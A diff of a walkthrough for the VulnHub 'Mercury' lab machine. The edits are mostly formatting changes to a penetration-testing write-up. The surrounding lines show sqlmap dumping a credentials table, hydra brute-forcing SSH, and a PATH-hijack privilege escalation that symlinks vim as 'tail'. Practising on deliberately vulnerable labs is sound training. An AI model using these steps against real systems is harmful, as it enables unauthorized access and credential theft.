@@ -39,7 +39,8 @@ http://192.168.188.169/*
 ```
 ![mercury_ ](https://github.com/shybu9/vulnhub/assets/112984045/fa516418-d1a9-4bf0-b902-c5f47f3e01ca)
 
--- directory '/mercuryfacts' seems to have an SQLI-vulnerable perimeter
+## Initial Foothold
+- directory '/mercuryfacts' seems to have an SQLI-vulnerable perimeter
 <br>
 
 ```
@@ -58,7 +59,7 @@ sqlmap --url http://192.168.188.169/mercuryfacts -D mercury -T users --dump --ba
 ```
 ![mercury_sqli_user_pass](https://github.com/shybu9/vulnhub/assets/112984045/77c357d5-59d6-4e5a-9f0a-9595d06c1465)
 
-
+<br>
 
 ### Finding the right credentials using hydra
 - A list of usernames and passwords can be generated from this sqlmap dumps
@@ -75,6 +76,7 @@ hydra -L users_list -P pswds_list ssh://192.168.188.169
 ### horizantal privesc
 - there was a note kept under 'mercury_proj' directory which has base64 encoded password of both web
 <br>
+
 ```
 cat mercury_proj/note.txt
 ```
@@ -96,7 +98,7 @@ sudo -l
 
 - file 'usr/bin/check_syslog.sh' can be executed by anyone but can only be edited by root.
 - an environment variable 'tail' is used without mentioning the full path.
-- this env variable can by abused by:
+- this env variable can be abused by:
 
 ```
 ln -s /usr/bin/vim tail
